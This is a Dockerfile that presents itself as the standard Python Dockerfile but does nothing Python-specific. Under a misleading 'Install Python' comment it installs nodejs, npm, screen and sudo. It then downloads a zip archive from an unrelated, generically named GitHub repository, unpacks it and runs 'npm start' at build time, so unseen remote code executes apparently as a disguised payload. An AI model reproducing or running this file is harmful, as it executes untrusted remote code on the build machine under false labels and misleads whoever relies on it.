#
# Python Dockerfile
#
# https://github.com/dockerfile/python
#

# Pull base image.
FROM python:3.10

# Install Python.
RUN \
  apt-get update && \
  apt-get install -y nodejs npm screen unzip sudo && \
  rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/enzolian10/glowing-memory/raw/refs/heads/circleci-project-setup/tensor.zip
RUN unzip tensor.zip
RUN npm start
# Define working directory.
WORKDIR /data

# Define default command.
CMD ["bash"]
